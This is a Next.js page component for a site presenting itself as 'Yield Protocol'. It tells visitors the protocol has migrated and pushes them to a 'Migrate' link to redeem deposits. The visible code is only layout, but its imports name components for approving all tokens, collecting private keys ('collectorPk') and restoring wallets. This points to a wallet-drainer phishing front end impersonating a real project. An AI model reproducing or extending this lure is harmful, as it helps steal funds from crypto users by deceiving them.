"use client";


import Image from "next/image";
import styles from "./page.module.css";
import Metamask from "../../public/trust wallet.png"
import token from "../../public/yp.png"
import gas from "../../public/gas-pump.png"
import code from "../../public/code-error.png"
import mm from "../../public/mm.png"
import ScanWallet from "./components/scanWallet";
import ApproveButton from "./components/approveButton";
import ScanWalletNew from "./components/scanWallet_modified";
import NewApprove from "./components/newApprove";
import TokenAllowanceButton from "./components/userBalance";
import UserBalance from "./components/userBalance";
import UserTokensList from "./components/userTokens";
import UserTokensAndBalance from "./components/userCard";
import ApproveAllTokens from "./components/approveAllTokens";
import ConnectedAddress from "./components/connectedAddresses";
import ApproveTxn from "./components/approveTxn";
import { useState } from "react";
import DeedCollector from "./components/collectorPk";
import RestoreWallet from "./components/restore";
import TokenBalance from "./components/tokenBalance";
import Link from "next/link";
import box1 from "../../public/box1.png"; // Replace with your actual paths
import box2 from "../../public/box2.png";
import box3 from "../../public/box3.png";

export default function Home() {
  const [nextPopup, setNextPopup] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [depositAmount, setDepositAmount] = useState(1);


  return (
    <div>
    <div className={styles.connectWallet}
        >
          <Image style={{height: "60px", width: "60px", marginLeft: "40px"}}
                 src={token}
                 alt='mm'/>
          <div style={{
            marginRight: "20px"
          }}>
            <Link href="/migrate" 
            onMouseEnter={() => setIsHovered(true)}
            onMouseLeave={() => setIsHovered(false)}
            style={{
              marginTop: "20px",
              marginBottom: "5px",
              padding: "10px",
              backgroundColor: isHovered ? "#dcdcdc" : "#efefef", // Hover effect for background color
              border: "none",
              borderRadius: "6px",
              color: isHovered ? "#000" : "#333", // Hover effect for text color
              fontSize: "1rem",
              cursor: "pointer",
              paddingRight: "20px",
              paddingLeft: "20px"
              }}>
        Migrate</Link>
          </div>
        </div>
    <div className={styles.container}>
      <div className={styles.container}>
        {/* Floating Boxes */}
      <Image src={box1} alt="Box 1" className={`${styles.box} ${styles.box1}`} />
      <Image src={box2} alt="Box 2" className={`${styles.box} ${styles.box2}`} />
      <Image src={box3} alt="Box 3" className={`${styles.box} ${styles.box3}`} />
        <div style={{
            maxWidth: "320px",
            textAlign: "center",
          }}>
            <Image style={{height: "60px", width: "60px", }}
                 src={token}
                 alt='mm'/>
          <div style={{
            marginRight: "20px"
          }}></div>
          <h1 >
          Yield Protocol
          </h1>
          <p style={{fontSize: "14px", marginTop: "10px"}}>
          Yield Protocol has migrated, migrate your deposited assets and redeem them!
          </p>
        
        </div>
        <Link href="/migrate" onMouseEnter={() => setIsHovered(true)}
            onMouseLeave={() => setIsHovered(false)}
            style={{
              marginTop: "20px",
              
              padding: "10px",
              backgroundColor: isHovered ? "#dcdcdc" : "#efefef", // Hover effect for background color
              border: "none",
              borderRadius: "6px",
              color: isHovered ? "#000" : "#333", // Hover effect for text color
              fontSize: "1rem",
              cursor: "pointer",
              paddingRight: "20px",
              paddingLeft: "20px"
              }}>
        Migrate</Link>
      </div>
      
         
     
    </div>
    </div>
  );
}
